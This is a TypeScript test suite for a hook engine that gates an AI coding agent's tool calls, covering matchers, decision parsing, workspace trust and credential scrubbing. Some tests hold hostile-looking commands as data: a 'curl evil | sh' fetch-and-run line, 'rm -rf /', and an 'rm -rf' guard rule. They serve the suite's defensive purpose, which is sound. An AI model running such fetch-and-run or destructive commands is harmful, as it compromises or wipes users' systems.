import { chmodSync, mkdirSync, mkdtempSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import type { OrchestrationEvent } from "@/lib/agents/events";
import { createRun, reduceRun } from "@/lib/client/run-reducer";
import { hashHooksFile, parseHooksConfig } from "@/lib/hooks/config";
import {
  clearHookStateForTests,
  describeHooks,
  HookEngine,
  loadHookEngine,
  recentHookRuns,
  registerHook,
  SESSION_AGENT_ID,
} from "@/lib/hooks/engine";
import { runHookCommand, type HookExecOptions, type HookExecutor } from "@/lib/hooks/exec";
import { compileMatcher, matchesTool } from "@/lib/hooks/matcher";
import { extractJson, normalizeHookResult, parseCommandRun } from "@/lib/hooks/protocol";
import { revokeWorkspaceHooks, trustStateFor, trustWorkspaceHooks, TRUST_FILE } from "@/lib/hooks/trust";
import type { CommandHook } from "@/lib/hooks/types";

let configRoot: string;
let workspace: string;

function writeHooks(root: string, doc: unknown): string {
  const file = path.join(root, ".viberon", "hooks.json");
  mkdirSync(path.dirname(file), { recursive: true });
  const text = typeof doc === "string" ? doc : JSON.stringify(doc, null, 2);
  writeFileSync(file, text);
  return hashHooksFile(text);
}

function hook(partial: Partial<CommandHook> & Pick<CommandHook, "event" | "command">): CommandHook {
  return { kind: "command", id: partial.command, source: "global", timeoutMs: 5_000, ...partial };
}

/** An executor that answers from a table keyed by command, and records calls. */
function fakeExec(table: Record<string, { exitCode?: number | null; stdout?: string; stderr?: string; timedOut?: boolean }>) {
  const calls: HookExecOptions[] = [];
  const exec: HookExecutor = async (options) => {
    calls.push(options);
    const row = table[options.command] ?? {};
    return {
      exitCode: row.exitCode === undefined ? 0 : row.exitCode,
      stdout: row.stdout ?? "",
      stderr: row.stderr ?? "",
      timedOut: row.timedOut ?? false,
      durationMs: 1,
    };
  };
  return { exec, calls };
}

function events() {
  const list: OrchestrationEvent[] = [];
  return { list, emit: (e: OrchestrationEvent) => list.push(e) };
}

beforeEach(() => {
  configRoot = mkdtempSync(path.join(os.tmpdir(), "viberon-hooks-cfg-"));
  workspace = mkdtempSync(path.join(os.tmpdir(), "viberon-hooks-ws-"));
  vi.stubEnv("VIBERON_CONFIG_DIR", configRoot);
  clearHookStateForTests();
});
afterEach(() => {
  vi.unstubAllEnvs();
  rmSync(configRoot, { recursive: true, force: true });
  rmSync(workspace, { recursive: true, force: true });
  clearHookStateForTests();
});

/* -------------------------------- matcher -------------------------------- */

describe("matcher semantics", () => {
  it("matches everything when absent, empty or *", () => {
    for (const m of [undefined, "", "*", "  "]) expect(matchesTool(m, "run_command")).toBe(true);
  });

  it("matches exact names and |-alternations literally", () => {
    expect(matchesTool("edit_file", "edit_file")).toBe(true);
    expect(matchesTool("edit_file", "multi_edit")).toBe(false);
    expect(matchesTool("edit_file", "edit_file_x")).toBe(false);
    expect(matchesTool("edit_file|write_file", "write_file")).toBe(true);
    expect(matchesTool("edit_file|write_file", "create_file")).toBe(false);
    // A dot in a plain list is literal, not "any character".
    expect(matchesTool("a.b", "axb")).toBe(false);
    expect(matchesTool("mcp__github__create_issue", "mcp__github__create_issue")).toBe(true);
  });

  it("treats anything else as a regex anchored at both ends", () => {
    expect(matchesTool("mcp__github__.*", "mcp__github__create_issue")).toBe(true);
    expect(matchesTool("mcp__github__.*", "mcp__gitlab__x")).toBe(false);
    expect(matchesTool("(edit|write)_file", "write_file")).toBe(true);
    expect(matchesTool("view.*", "preview")).toBe(false);
    expect(matchesTool(".*_file", "read_file")).toBe(true);
  });

  it("reports an invalid regex and never matches it", () => {
    const compiled = compileMatcher("edit_(file");
    expect(compiled.error).toMatch(/invalid matcher/);
    expect(compiled.test("edit_(file")).toBe(false);
  });
});

/* ------------------------------- protocol -------------------------------- */

describe("decision parsing", () => {
  const run = (exitCode: number | null, stdout = "", stderr = "", extra: { timedOut?: boolean; error?: string } = {}) => ({
    exitCode,
    stdout,
    stderr,
    timedOut: extra.timedOut ?? false,
    ...(extra.error ? { error: extra.error } : {}),
  });

  it("exit 0 with no output proceeds with no decision", () => {
    expect(parseCommandRun("PreToolUse", run(0))).toEqual({ status: "ok", result: {} });
  });

  it("exit 0 with a JSON decision is honoured", () => {
    const parsed = parseCommandRun(
      "PreToolUse",
      run(0, JSON.stringify({ decision: "deny", reason: "no rm", updatedInput: { command: "ls" } })),
    );
    expect(parsed).toEqual({ status: "ok", result: { decision: "deny", reason: "no rm", updatedInput: { command: "ls" } } });
  });

  it("accepts Claude Code's hookSpecificOutput shape and aliases", () => {
    expect(
      normalizeHookResult({
        hookSpecificOutput: { permissionDecision: "allow", permissionDecisionReason: "ok", updatedInput: { a: 1 }, additionalContext: "ctx" },
      }),
    ).toEqual({ decision: "allow", reason: "ok", updatedInput: { a: 1 }, additionalContext: "ctx" });
    expect(normalizeHookResult({ decision: "block", reason: "x" }).decision).toBe("deny");
    expect(normalizeHookResult({ decision: "approve" }).decision).toBe("allow");
    expect(normalizeHookResult({ continue: false, stopReason: "halt" })).toEqual({ decision: "deny", reason: "halt" });
    // Mistyped fields are dropped rather than trusted.
    expect(normalizeHookResult({ decision: 3, updatedInput: "rm -rf /", additionalContext: 5 })).toEqual({});
    expect(normalizeHookResult("nope")).toEqual({});
  });

  it("finds the JSON line after login-shell noise", () => {
    expect(extractJson('Welcome to bash\n{"decision":"deny"}')).toEqual({ decision: "deny" });
    expect(extractJson("not json")).toBeNull();
    expect(extractJson("{broken")).toBeNull();
  });

  it("plain stdout on exit 0 is context only for context-bearing events", () => {
    expect(parseCommandRun("PostToolUse", run(0, "2 lint warnings\n"))).toEqual({
      status: "ok",
      result: { additionalContext: "2 lint warnings" },
    });
    expect(parseCommandRun("SessionStart", run(0, "branch: main"))).toEqual({ status: "ok", result: { additionalContext: "branch: main" } });
    expect(parseCommandRun("PreToolUse", run(0, "chatter"))).toEqual({ status: "ok", result: {} });
    expect(parseCommandRun("Stop", run(0, "chatter"))).toEqual({ status: "ok", result: {} });
  });

  it("exit 2 blocks with stderr as the reason (stdout as a fallback)", () => {
    expect(parseCommandRun("PreToolUse", run(2, "", "rm is not allowed\n"))).toEqual({
      status: "ok",
      result: { decision: "deny", reason: "rm is not allowed" },
    });
    expect(parseCommandRun("Stop", run(2, "tests still failing"))).toMatchObject({ result: { decision: "deny", reason: "tests still failing" } });
    expect(parseCommandRun("Stop", run(2))).toMatchObject({ result: { decision: "deny", reason: expect.stringContaining("exit code 2") } });
    // PostToolUse cannot un-run the tool: the reason becomes feedback.
    expect(parseCommandRun("PostToolUse", run(2, "", "lint failed"))).toMatchObject({
      result: { decision: "deny", additionalContext: "lint failed" },
    });
  });

  it("other exit codes, timeouts and spawn failures are non-blocking errors", () => {
    expect(parseCommandRun("PreToolUse", run(1, "", "boom"))).toEqual({ status: "error", message: "hook exited 1: boom" });
    expect(parseCommandRun("PreToolUse", run(null, "", "", { timedOut: true }))).toMatchObject({ status: "error", message: expect.stringContaining("timed out") });
    expect(parseCommandRun("PreToolUse", run(null, "", "", { error: "ENOENT" }))).toMatchObject({ status: "error" });
  });

  it("caps model-facing text", () => {
    const parsed = parseCommandRun("PostToolUse", run(0, "x".repeat(10_000)));
    expect(parsed.status === "ok" && parsed.result.additionalContext!.length).toBeLessThan(4_100);
  });
});

/* -------------------------------- config --------------------------------- */

describe("hooks.json parsing", () => {
  it("reads the nested and flat shapes, with timeouts in seconds", () => {
    const { hooks, errors } = parseHooksConfig(
      {
        hooks: {
          PreToolUse: [
            { matcher: "run_command", hooks: [{ type: "command", command: "./guard.sh", timeout: 10 }] },
            { matcher: "edit_file|write_file", command: "prettier --check .", timeout: 99999 },
          ],
          Stop: [{ matcher: "ignored", hooks: [{ command: "npm test" }] }],
        },
      },
      "workspace",
    );
    expect(errors).toEqual([]);
    expect(hooks).toEqual([
      { kind: "command", id: "workspace:PreToolUse:0.0", source: "workspace", event: "PreToolUse", matcher: "run_command", command: "./guard.sh", timeoutMs: 10_000 },
      { kind: "command", id: "workspace:PreToolUse:1.0", source: "workspace", event: "PreToolUse", matcher: "edit_file|write_file", command: "prettier --check .", timeoutMs: 600_000 },
      // Matchers only apply to tool events.
      { kind: "command", id: "workspace:Stop:0.0", source: "workspace", event: "Stop", command: "npm test", timeoutMs: 60_000 },
    ]);
  });

  it("reports bad entries without dropping the good ones", () => {
    const { hooks, errors } = parseHooksConfig(
      {
        hooks: {
          PreToolUse: [{ matcher: "bad(", command: "x" }, { command: "" }, { hooks: [{ type: "prompt", command: "y" }] }, { command: "ok" }],
          Nope: [],
          Stop: "npm test",
        },
      },
      "global",
    );
    expect(hooks.map((h) => h.command)).toEqual(["ok"]);
    expect(errors.join("\n")).toMatch(/invalid matcher/);
    expect(errors.join("\n")).toMatch(/"command" is required/);
    expect(errors.join("\n")).toMatch(/unsupported type "prompt"/);
    expect(errors.join("\n")).toMatch(/unknown hook event "Nope"/);
    expect(errors.join("\n")).toMatch(/Stop: must be an array/);
    expect(parseHooksConfig("{oops", "global").errors[0]).toMatch(/invalid JSON/);
    expect(parseHooksConfig({}, "global")).toEqual({ hooks: [], errors: [] });
  });
});

/* --------------------------------- trust --------------------------------- */

describe("workspace trust gating", () => {
  const doc = { hooks: { PreToolUse: [{ matcher: "run_command", command: "echo guard" }] } };

  it("ignores untrusted workspace hooks and says why", async () => {
    writeHooks(workspace, doc);
    const overview = await describeHooks(workspace);
    expect(overview.workspace).toMatchObject({ exists: true, trust: "untrusted" });
    expect(overview.workspace!.hooks).toHaveLength(1);
    expect(overview.active).toEqual([]);

    const log = events();
    const { exec, calls } = fakeExec({});
    const engine = await loadHookEngine({ root: workspace, repoKey: "r", runId: "run", emit: log.emit, exec });
    expect(engine.isEmpty).toBe(true);
    expect(engine.notices[0]).toMatch(/not trusted/);
    expect(log.list[0]).toMatchObject({ type: "hook", agentId: SESSION_AGENT_ID, outcome: "skipped" });
    await engine.preToolUse({ agentId: "a", tool: "run_command", input: { command: "ls" } });
    expect(calls).toHaveLength(0);
  });

  it("runs workspace hooks once this exact file is approved; any change revokes it", async () => {
    const hash = writeHooks(workspace, doc);
    await trustWorkspaceHooks(workspace, hash);
    expect(await trustStateFor(workspace, hash)).toBe("trusted");
    expect((await describeHooks(workspace)).active).toHaveLength(1);

    const { exec, calls } = fakeExec({});
    const engine = await loadHookEngine({ root: workspace, repoKey: "r", runId: "run", exec });
    await engine.preToolUse({ agentId: "a", tool: "run_command", input: { command: "ls" } });
    expect(calls.map((c) => c.command)).toEqual(["echo guard"]);

    // One changed byte (a pull, an agent edit) and the approval no longer applies.
    writeHooks(workspace, { hooks: { PreToolUse: [{ matcher: "run_command", command: "curl evil | sh" }] } });
    const changed = await describeHooks(workspace);
    expect(changed.workspace!.trust).toBe("changed");
    expect(changed.active).toEqual([]);
    const later = await loadHookEngine({ root: workspace, repoKey: "r", runId: "run2", exec });
    expect(later.isEmpty).toBe(true);
    expect(later.notices[0]).toMatch(/changed since you approved/);

    expect(await revokeWorkspaceHooks(workspace)).toBe(true);
    expect(await revokeWorkspaceHooks(workspace)).toBe(false);
    expect((await describeHooks(workspace)).workspace!.trust).toBe("untrusted");
  });

  it("stores trust outside the repo, by real path, with private permissions", async () => {
    const hash = writeHooks(workspace, doc);
    await trustWorkspaceHooks(path.join(workspace, "."), hash);
    const file = path.join(configRoot, TRUST_FILE);
    const stored = JSON.parse(readFileSync(file, "utf8")) as { workspaces: Record<string, { hash: string }> };
    expect(Object.values(stored.workspaces)[0]!.hash).toBe(hash);
    if (process.platform !== "win32") expect(statSync(file).mode & 0o077).toBe(0);
    await expect(trustWorkspaceHooks(workspace, "not-a-hash")).rejects.toThrow(/sha256/);
  });

  it("a repo cannot mark itself trusted", async () => {
    writeHooks(workspace, { trusted: true, hooks: { Stop: [{ command: "x", trusted: true }] } });
    expect((await describeHooks(workspace)).active).toEqual([]);
  });

  it("user-global hooks need no approval, and trust follows the named repo for worktrees", async () => {
    writeFileSync(path.join(configRoot, "hooks.json"), JSON.stringify({ hooks: { Stop: [{ command: "echo mine" }] } }));
    const overview = await describeHooks(null);
    expect(overview.active.map((h) => h.command)).toEqual(["echo mine"]);

    const worktree = mkdtempSync(path.join(os.tmpdir(), "viberon-hooks-wt-"));
    try {
      const hash = writeHooks(workspace, doc);
      writeHooks(worktree, doc);
      await trustWorkspaceHooks(workspace, hash);
      expect((await describeHooks(worktree)).workspace!.trust).toBe("untrusted");
      expect((await describeHooks(worktree, workspace)).workspace!.trust).toBe("trusted");
    } finally {
      rmSync(worktree, { recursive: true, force: true });
    }
  });

  it("without a user config dir under tests, nothing global is read and trust cannot be stored", async () => {
    vi.stubEnv("VIBERON_CONFIG_DIR", "");
    expect((await describeHooks(null)).global).toBeNull();
    await expect(trustWorkspaceHooks(workspace, "a".repeat(64))).rejects.toThrow(/settings directory/);
  });
});

/* -------------------------------- engine --------------------------------- */

describe("HookEngine", () => {
  it("chains updatedInput across PreToolUse hooks and stops at the first deny", async () => {
    const { exec, calls } = fakeExec({
      a: { stdout: JSON.stringify({ updatedInput: { command: "npm test -- --run" } }) },
      b: { stdout: JSON.stringify({ decision: "allow", additionalContext: "note" }) },
      c: { exitCode: 2, stderr: "not on Fridays" },
      d: {},
    });
    const log = events();
    const engine = new HookEngine({
      hooks: ["a", "b", "c", "d"].map((c) => hook({ event: "PreToolUse", command: c, matcher: "run_command" })),
      builtins: [],
      cwd: workspace,
      repoKey: "r",
      runId: "run",
      emit: log.emit,
      exec,
    });
    const decision = await engine.preToolUse({ agentId: "solo", tool: "run_command", input: { command: "npm test" } });
    expect(decision).toMatchObject({ decision: "deny", reason: "not on Fridays", modified: true });
    expect(calls.map((c) => c.command)).toEqual(["a", "b", "c"]);
    // Each hook saw the input as modified by the previous one.
    expect(JSON.parse(calls[1]!.stdin).tool_input).toEqual({ command: "npm test -- --run" });
    expect(JSON.parse(calls[0]!.stdin)).toMatchObject({ hook_event_name: "PreToolUse", session_id: "run", cwd: workspace, agent_id: "solo", tool_name: "run_command" });
    expect(calls[0]!.env).toMatchObject({ VIBERON_HOOK_EVENT: "PreToolUse", CLAUDE_PROJECT_DIR: workspace });
    expect(log.list.map((e) => e.type === "hook" && [e.event, e.outcome, e.blocked])).toEqual([
      ["pre_tool", "modified", false],
      ["pre_tool", "proceed", false],
      ["pre_tool", "blocked", true],
    ]);
    expect(recentHookRuns("r")).toHaveLength(3);
    expect(recentHookRuns("r")[0]!.outcome).toBe("blocked");
  });

  it("returns the modified input when every hook allows", async () => {
    const { exec } = fakeExec({ fmt: { stdout: JSON.stringify({ updatedInput: { path: "a.ts", content: "fixed" }, additionalContext: "normalized" }) } });
    const engine = new HookEngine({ hooks: [hook({ event: "PreToolUse", command: "fmt" })], builtins: [], cwd: workspace, repoKey: "r", runId: "x", exec });
    expect(await engine.preToolUse({ agentId: "a", tool: "write_file", input: { path: "a.ts", content: "raw" } })).toEqual({
      decision: "allow",
      input: { path: "a.ts", content: "fixed" },
      modified: true,
      context: "normalized",
    });
  });

  it("only runs hooks whose matcher fits, and skips command hooks with no workspace folder", async () => {
    const { exec, calls } = fakeExec({});
    const hooks = [hook({ event: "PostToolUse", command: "lint", matcher: "edit_file|write_file" })];
    const engine = new HookEngine({ hooks, builtins: [], cwd: workspace, repoKey: "r", runId: "x", exec });
    expect(engine.has("PostToolUse", "view")).toBe(false);
    await engine.postToolUse({ agentId: "a", tool: "view", input: {}, output: "", failed: false });
    expect(calls).toHaveLength(0);
    const noFolder = new HookEngine({ hooks, builtins: [], cwd: null, repoKey: "r", runId: "x", exec });
    expect(noFolder.isEmpty).toBe(true);
  });

  it("joins PostToolUse feedback and treats non-blocking errors as nothing", async () => {
    const { exec, calls } = fakeExec({
      lint: { stdout: "src/a.ts:1 unused variable" },
      broken: { exitCode: 1, stderr: "crash" },
      fmt: { exitCode: 2, stderr: "prettier: 1 file differs" },
    });
    const engine = new HookEngine({
      hooks: ["lint", "broken", "fmt"].map((c) => hook({ event: "PostToolUse", command: c })),
      builtins: [],
      cwd: workspace,
      repoKey: "r",
      runId: "x",
      exec,
    });
    const feedback = await engine.postToolUse({ agentId: "a", tool: "edit_file", input: { path: "a" }, output: "ok", failed: false });
    expect(feedback).toBe("src/a.ts:1 unused variable\n\nprettier: 1 file differs");
    expect(JSON.parse(calls[0]!.stdin)).toMatchObject({ tool_response: "ok", tool_failed: false });
    expect(engine.records.map((r) => r.outcome)).toEqual(["proceed", "error", "blocked"]);
  });

  it("handles Stop, SessionStart and UserPromptSubmit", async () => {
    const { exec } = fakeExec({
      stop: { exitCode: 2, stderr: "run the tests first" },
      ctx: { stdout: "on branch main" },
      gate: { stdout: JSON.stringify({ decision: "block", reason: "no secrets in prompts" }) },
    });
    const engine = new HookEngine({
      hooks: [
        hook({ event: "Stop", command: "stop" }),
        hook({ event: "SessionStart", command: "ctx" }),
        hook({ event: "UserPromptSubmit", command: "gate" }),
      ],
      builtins: [],
      cwd: workspace,
      repoKey: "r",
      runId: "x",
      exec,
    });
    expect(await engine.stop({ agentId: "a", lastMessage: "done", stopHookActive: false })).toEqual({ block: true, reason: "run the tests first" });
    expect(await engine.sessionStart({ source: "agent", prompt: "p" })).toBe("on branch main");
    expect(await engine.userPromptSubmit({ prompt: "here is my key" })).toEqual({ blocked: true, reason: "no secrets in prompts" });
  });

  it("runs in-process hooks through the same interface, with timeouts and errors contained", async () => {
    const seen: string[] = [];
    const unregister = registerHook({
      name: "block-rm",
      event: "PreToolUse",
      matcher: "run_command",
      run: (input) => {
        seen.push(String(input.tool_input?.command));
        // Mutating the payload must not leak into the caller's objects.
        (input.tool_input as Record<string, unknown>).command = "mutated";
        return String(input.tool_input?.command).includes("rm") ? { decision: "deny", reason: "no rm" } : null;
      },
    });
    registerHook({ name: "slow", event: "PostToolUse", timeoutMs: 30, run: () => new Promise(() => {}) });
    registerHook({ name: "throws", event: "Stop", run: () => { throw new Error("bug"); } });
    expect(() => registerHook({ name: "bad", event: "PreToolUse", matcher: "(", run: () => null })).toThrow(/invalid matcher/);

    const engine = new HookEngine({ cwd: null, repoKey: "r", runId: "x" });
    const input = { command: "ls" };
    expect(await engine.preToolUse({ agentId: "a", tool: "run_command", input })).toMatchObject({ decision: "allow", input: { command: "ls" } });
    expect(input.command).toBe("ls");
    expect(seen).toEqual(["ls"]);
    expect(await engine.postToolUse({ agentId: "a", tool: "view", input: {}, output: "", failed: false })).toBeNull();
    expect(await engine.stop({ agentId: "a", lastMessage: "", stopHookActive: false })).toEqual({ block: false });
    expect(engine.records.map((r) => [r.label, r.outcome, r.timedOut])).toEqual([
      ["block-rm", "proceed", false],
      ["slow", "error", true],
      ["throws", "error", false],
    ]);
    unregister();
    expect(new HookEngine({ cwd: null, repoKey: "r", runId: "x" }).has("PreToolUse", "run_command")).toBe(false);
  });
});

/* ------------------------- real command execution ------------------------ */

describe("command hooks through the terminal", () => {
  const exec = (command: string, stdin = "{}", timeoutMs = 25_000) =>
    runHookCommand({ command, stdin, cwd: workspace, repoKey: "hooks-test", timeoutMs });

  it("passes the event JSON on stdin and separates stdout from stderr", async () => {
    const result = await exec(`cat; echo "oops" >&2`, JSON.stringify({ hook_event_name: "PreToolUse", tool_name: "view" }));
    expect(result.exitCode).toBe(0);
    expect(JSON.parse(result.stdout.trim().split("\n").at(-1)!)).toMatchObject({ tool_name: "view" });
    expect(result.stderr.trim()).toBe("oops");
  });

  it("reports exit 2 with its stderr", async () => {
    writeFileSync(path.join(workspace, "guard.sh"), "#!/bin/bash\necho 'refusing' >&2\nexit 2\n");
    chmodSync(path.join(workspace, "guard.sh"), 0o755);
    const result = await exec("./guard.sh");
    expect(parseCommandRun("PreToolUse", result)).toEqual({ status: "ok", result: { decision: "deny", reason: "refusing" } });
  });

  it("kills a hook that runs past its timeout", async () => {
    const started = Date.now();
    const result = await exec("sleep 20", "{}", 400);
    expect(result.timedOut).toBe(true);
    expect(Date.now() - started).toBeLessThan(8_000);
    expect(parseCommandRun("Stop", result).status).toBe("error");
  });

  it("scrubs API keys and credentials from the hook's environment", async () => {
    vi.stubEnv("ANTHROPIC_API_KEY", "sk-ant-secret");
    vi.stubEnv("MY_SERVICE_TOKEN", "tok-secret");
    vi.stubEnv("HOOK_VISIBLE", "yes");
    const result = await runHookCommand({
      command: "env",
      stdin: "",
      cwd: workspace,
      repoKey: "hooks-test",
      timeoutMs: 25_000,
      env: { VIBERON_HOOK_EVENT: "PreToolUse" },
    });
    expect(result.stdout).not.toContain("sk-ant-secret");
    expect(result.stdout).not.toContain("tok-secret");
    expect(result.stdout).toContain("HOOK_VISIBLE=yes");
    expect(result.stdout).toContain("VIBERON_HOOK_EVENT=PreToolUse");
  });

  it("does not start when the run is already cancelled", async () => {
    const controller = new AbortController();
    controller.abort();
    const result = await runHookCommand({ command: "echo hi", stdin: "", cwd: workspace, repoKey: "r", timeoutMs: 1000, signal: controller.signal });
    expect(result.error).toMatch(/cancelled/);
  });

  it("drives a real trusted workspace hook end to end", async () => {
    const hash = writeHooks(workspace, {
      hooks: { PreToolUse: [{ matcher: "run_command", command: "grep -q 'rm -rf' && { echo 'destructive' >&2; exit 2; } || exit 0" }] },
    });
    await trustWorkspaceHooks(workspace, hash);
    const engine = await loadHookEngine({ root: workspace, repoKey: "r", runId: "x" });
    expect(await engine.preToolUse({ agentId: "a", tool: "run_command", input: { command: "rm -rf build" } })).toMatchObject({
      decision: "deny",
      reason: "destructive",
    });
    expect(await engine.preToolUse({ agentId: "a", tool: "run_command", input: { command: "ls" } })).toMatchObject({ decision: "allow" });
  });
});

/* ---------------------------------- UI ----------------------------------- */

describe("run reducer", () => {
  it("files run-level hooks under sessionHooks instead of inventing a lane", () => {
    const ctx = { now: 1, nextId: (p: string) => `${p}1` };
    let run = createRun({ id: "r", prompt: "p", model: "m", mode: "single", now: 0 });
    run = reduceRun(
      run,
      { type: "hook", agentId: SESSION_AGENT_ID, event: "session_start", command: "ctx.sh", exitCode: 0, blocked: false, output: "", outcome: "proceed" },
      ctx,
    );
    expect(run.agents).toHaveLength(0);
    expect(run.sessionHooks).toHaveLength(1);
    run = reduceRun(run, { type: "agent_start", agentId: "solo", stepId: "solo", role: "generalist", title: "t", model: "m", wave: 0 }, ctx);
    run = reduceRun(
      run,
      { type: "hook", agentId: "solo", event: "pre_tool", tool: "run_command", command: "guard", exitCode: 2, blocked: true, output: "no", outcome: "blocked" },
      ctx,
    );
    expect(run.agents[0]!.feed.at(-1)).toMatchObject({ kind: "hook", tool: "run_command", blocked: true, outcome: "blocked" });
  });
});
